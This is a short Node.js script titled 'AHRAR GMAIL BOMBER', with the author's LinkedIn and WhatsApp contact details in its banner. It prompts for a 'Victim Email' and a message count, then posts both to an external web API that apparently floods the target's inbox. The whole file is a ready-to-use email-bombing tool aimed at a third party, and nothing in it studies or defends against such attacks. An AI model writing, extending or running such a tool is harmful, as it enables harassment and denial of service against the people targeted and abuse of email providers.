import readline from "readline";
import fetch from "node-fetch";

console.clear();

const divider = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━";

console.log(`
${divider}

   💣  AHRAR GMAIL BOMBER  💣

   Developed By Ahrar
   🔗 LinkedIn : https://linkedin.com/in/ahrar-shah
   📱 WhatsApp : https://wa.me/923312044136

${divider}
`);

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

rl.question("📧 Enter Victim Email : ", (email) => {
  rl.question("🔢 Enter Count : ", async (count) => {

    console.log(`\n${divider}\n`);

    try {
      const res = await fetch(
        "https://termux-mail-bomber-bot.vercel.app/api/send",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            email,
            count: Number(count)
          })
        }
      );

      const data = await res.json();

      if (data.success) {
        console.log("✅ SUCCESS");
        console.log(data.success);
      } else {
        console.log("❌ ERROR");
        console.log(data.error);
      }

    } catch (err) {
      console.log("❌ ERROR");
      console.log(err.message);
    }

    console.log(`\n${divider}\n`);
    rl.close();
  });
});